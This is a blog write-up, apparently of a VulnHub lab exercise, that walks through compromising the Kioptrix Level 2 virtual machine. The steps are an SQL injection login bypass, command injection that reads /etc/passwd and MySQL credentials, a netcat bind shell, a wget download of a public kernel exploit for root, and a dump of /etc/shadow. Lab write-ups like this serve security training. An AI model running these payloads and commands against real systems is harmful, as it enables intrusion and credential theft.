---
layout: post
title: "Kioptrix: Level 2"
date: 2015-05-11 19:15:08 +0200
comments: true
categories: [vulnhub, kioptrix]
---
Image: [Kioptrix: Level 1.1 (#2)](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

Nmap output:
{% codeblock %}
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:53:19:4C (VMware)
{% endcodeblock %}

We connect to the web page and log in using username / password (SQLi):
{% codeblock %}
test' or '1'='1
{% endcodeblock %}

Now we got the access to the "Basic Administrative Web Console". Trying command
injection, we found out that we can inject arbitrary command and execute under
web user privileges.

Request / response example:
{% codeblock %}
POST /pingit.php HTTP/1.1
Host: 192.168.80.144
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.80.144/index.php
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

ip=127.0.0.1 %26%26 cat /etc/passwd&submit=submit
{% endcodeblock %}

{% codeblock %}
HTTP/1.1 200 OK
Date: Sat, 09 May 2015 15:02:56 GMT
Server: Apache/2.0.52 (CentOS)
X-Powered-By: PHP/4.3.9
Content-Length: 2187
Connection: close
Content-Type: text/html; charset=UTF-8

127.0.0.1 && cat /etc/passwd<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.008 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.008/0.012/0.015/0.005 ms, pipe 2
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
</pre>
{% endcodeblock %}

Web server fingerprints:
{% codeblock %}
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
{% endcodeblock %}

We don't have writable access under DocumentRoot. Looking to different
directories, we found the netcat source remains.
{% codeblock %}
drwxrwxrwx  7 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1
drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc/drafts
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/po
drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib/contrib
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/src
drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/m4
drwxrwxr-x  5 root sys 4096 Oct  7  2009 /etc/cups
drwxr-xrwx  4 root root 4096 May  9 12:11 /tmp
drwxrwxrwt  2 root root 4096 May  9 10:17 /tmp/.ICE-unix
drwxrwxrwt  2 root root 4096 May  9 10:18 /tmp/.font-unix
{% endcodeblock %}

So there should be netcat installed, we will need this information later. 

We can read index.php for mysql credentials:
{% codeblock %}
ip=127.0.0.1 %26%26 cat index.php&submit=submit
..
<?php
	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
	mysql_select_db("webapp");
	
	if ($_POST['uname'] != ""){
		$username = $_POST['uname'];
		$password = $_POST['psw'];
		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
		//print $query."<br>";
		$result = mysql_query($query);

		$row = mysql_fetch_array($result);
		//print "ID: ".$row['id']."<br />";
	}

?>
{% endcodeblock %}

The john's password doesn't work for ssh, but at least we can extract more from
mysql database:
{% codeblock %}
ip=127.0.0.1 %26%26 echo show databases|mysql -ujohn -phiroshima&submit=submit
Database
mysql
test
webapp

ip=127.0.0.1 %26%26 echo 'use webapp; show tables'|mysql -ujohn -phiroshima&submit=submit
id	username	password
1	admin	5afac8d85f
2	john	66lajGGbla
{% endcodeblock %}

Again, the passwords don't work for ssh. 

We find netcat and use it to bind a shell, then we try to root the box:
{% codeblock %}
ip=127.0.0.1 %26%26 find / -iname \*netcat\*&submit=submit
..
/usr/share/zsh/4.2.0/functions/_netcat
/usr/local/info/netcat.info
/usr/local/share/locale/sk/LC_MESSAGES/netcat.mo
/usr/local/share/locale/it/LC_MESSAGES/netcat.mo
/usr/local/man/man1/netcat.1
/usr/local/bin/netcat
/usr/src/netcat-0.7.1
/usr/src/netcat-0.7.1/doc/netcat.1
/usr/src/netcat-0.7.1/doc/netcat.info
/usr/src/netcat-0.7.1/doc/netcat.texi
/usr/src/netcat-0.7.1/doc/netcat.pod
/usr/src/netcat-0.7.1/po/netcat.pot
/usr/src/netcat-0.7.1/src/netcat.c
/usr/src/netcat-0.7.1/src/netcat.h
/usr/src/netcat-0.7.1/src/netcat.o
/usr/src/netcat-0.7.1/src/netcat
{% endcodeblock %}

{% codeblock %}
ip=127.0.0.1 %26%26 /usr/local/bin/netcat -e /bin/sh -l -p 1337&submit=submit
{% endcodeblock %}

{% codeblock %}
root@kali32:/var/www# nc 192.168.80.144 1337

id
uid=48(apache) gid=48(apache) groups=48(apache)

uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
{% endcodeblock %}

Luckily, exploitdb contains local root exploit with exactly this version of kernel:
{% codeblock %}
root@kali32:/usr/share/exploitdb# grep -irn '2.6.9-55.EL' *
platforms/linux/local/9542.c:7:** CentOS 4.4(2.6.9-42.ELsmp), CentOS 4.5(2.6.9-55.ELsmp),
{% endcodeblock %}

As our last step, we download and compile this exploit
https://www.exploit-db.com/exploits/9542/ .

{% codeblock %}
cd /tmp/
wget https://www.exploit-db.com/download/9542 -O 9542.c --no-check-certificate

gcc 9542.c
./a.out
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00# 

sh-3.00# cat /etc/shadow
root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
bin:*:14525:0:99999:7:::
daemon:*:14525:0:99999:7:::
adm:*:14525:0:99999:7:::
lp:*:14525:0:99999:7:::
sync:*:14525:0:99999:7:::
shutdown:*:14525:0:99999:7:::
halt:*:14525:0:99999:7:::
mail:*:14525:0:99999:7:::
news:*:14525:0:99999:7:::
uucp:*:14525:0:99999:7:::
operator:*:14525:0:99999:7:::
games:*:14525:0:99999:7:::
gopher:*:14525:0:99999:7:::
ftp:*:14525:0:99999:7:::
nobody:*:14525:0:99999:7:::
dbus:!!:14525:0:99999:7:::
vcsa:!!:14525:0:99999:7:::
rpm:!!:14525:0:99999:7:::
haldaemon:!!:14525:0:99999:7:::
netdump:!!:14525:0:99999:7:::
nscd:!!:14525:0:99999:7:::
sshd:!!:14525:0:99999:7:::
rpc:!!:14525:0:99999:7:::
mailnull:!!:14525:0:99999:7:::
smmsp:!!:14525:0:99999:7:::
rpcuser:!!:14525:0:99999:7:::
nfsnobody:!!:14525:0:99999:7:::
pcap:!!:14525:0:99999:7:::
apache:!!:14525:0:99999:7:::
squid:!!:14525:0:99999:7:::
webalizer:!!:14525:0:99999:7:::
xfs:!!:14525:0:99999:7:::
ntp:!!:14525:0:99999:7:::
pegasus:!!:14525:0:99999:7:::
mysql:!!:14525::::::
john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
sh-3.00# 
{% endcodeblock %}
